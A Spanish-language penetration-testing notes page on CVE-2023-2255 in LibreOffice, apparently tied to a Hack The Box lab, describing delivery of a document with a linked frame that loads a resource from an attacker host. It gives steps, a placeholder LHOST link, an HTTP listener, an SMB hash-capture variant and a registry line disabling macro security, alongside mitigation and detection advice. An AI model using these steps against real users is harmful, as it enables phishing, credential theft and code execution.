---
topic: LibreOffice — carga de enlaces externos sin aviso (CVE-2023-2255)
tags: [windows, libreoffice, cve-2023-2255, documento, phishing, rce, office]
---

# LibreOffice — carga de enlaces externos sin aviso (CVE-2023-2255)

[🌐 English](libreoffice-weblink-rce.en.md) | **Español**

## Concepto

LibreOffice permite insertar marcos flotantes enlazados a archivos externos. En versiones 7.4 anteriores a 7.4.7 y 7.5 anteriores a 7.5.3, al abrir un documento con uno de esos marcos, el contenido externo se carga sin pedir permiso al usuario. Un atacante puede alojar ese contenido y conseguir que el documento cargue un recurso propio al abrirse, lo que sirve para ejecutar código o para capturar credenciales. En Office, el sitio interno de currículums permitía subir el documento y `PPotts` lo abría.

## Cuándo aplica

- LibreOffice en el rango afectado (7.4 < 7.4.7, 7.5 < 7.5.3).
- La víctima abre documentos enviados por terceros.
- La configuración no bloquea la actualización de enlaces externos.
- El atacante puede alojar un archivo accesible desde la víctima (HTTP, SMB, WebDAV).

## Procedimiento

1. Crear un documento con un marco flotante enlazado a un archivo externo.
2. Alojar ese archivo en un servidor controlado.
3. Entregar el documento por el canal que use la víctima (currículum, correo, ticket).
4. Esperar a que se abra y se cargue el enlace.
5. Ejecutar el comando o capturar la petición con las credenciales.

## Comandos

```text
Insertar → Marco → Enlace a archivo → http://<LHOST>/<RECURSO>
```

```bash
python3 -m http.server 80
# registrar la petición cuando el documento se abra
```

```text
# alternativa sin CVE: bajar la seguridad de macros en el registro
HKCU\Software\LibreOffice\Share\Security\Scripting\MacroSecurityLevel = 0
```

## Variantes

- Enlazar a un recurso SMB para capturar el hash NetNTLM de la víctima.
- Usar un archivo que LibreOffice interprete y ejecute al cargarse.
- Combinar con una macro si la política de seguridad lo permite.
- Enviar el documento como `.odt`, `.docx` o `.ods` según el filtro.

## Limitaciones

- La versión corregida pregunta antes de cargar el contenido externo.
- La víctima debe abrir el documento y permitir la carga.
- Un firewall puede bloquear la salida al servidor del atacante.
- Las políticas de macros y de enlaces pueden impedir la ejecución.

## Mitigación

- Actualizar LibreOffice a 7.4.7, 7.5.3 o posterior.
- Deshabilitar la actualización automática de enlaces externos.
- Bloquear la salida SMB/HTTP de los puestos hacia Internet.
- Abrir documentos no confiables en un entorno aislado.
- Aplicar políticas que impidan bajar el nivel de seguridad de macros.

## Detección

- Documentos con marcos enlazados a rutas externas.
- Conexiones salientes HTTP, SMB o WebDAV desde estaciones al abrir un archivo.
- Procesos hijos de `soffice.exe` (`cmd.exe`, `powershell.exe`).
- Cambios en `MacroSecurityLevel` del registro.

## Referencias

- [NVD — CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)
- [LibreOffice — Security advisories](https://www.libreoffice.org/about-us/security/advisories/)
- [0xdf — Office](https://0xdf.gitlab.io/2024/06/22/htb-office.html)
- [Ficha Office](../../machines/windows/office/README.md)
